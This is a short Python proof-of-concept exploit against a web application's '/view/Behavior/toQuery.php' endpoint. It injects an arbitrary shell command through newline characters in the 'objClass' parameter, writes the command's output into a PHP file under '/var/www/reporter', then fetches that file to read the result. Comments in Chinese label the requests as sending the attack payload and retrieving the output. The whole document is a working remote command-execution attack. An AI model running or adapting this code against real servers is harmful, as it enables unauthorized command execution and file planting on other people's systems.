import requests


def exp(url='', cmd='ls'):
    url1 = url + f"/view/Behavior/toQuery.php?method=getList&objClass=\n {cmd} > /var/www/reporter/view/Behavior/log.php\n"
    url2 = url + "/view/Behavior/log.php"

    re1 = requests.get(url1)  # 发送攻击负载
    re2 = requests.get(url2)  # 取得返回值
    print(re1.status_code)
    print(re2.content.decode())
    return re2.content.decode()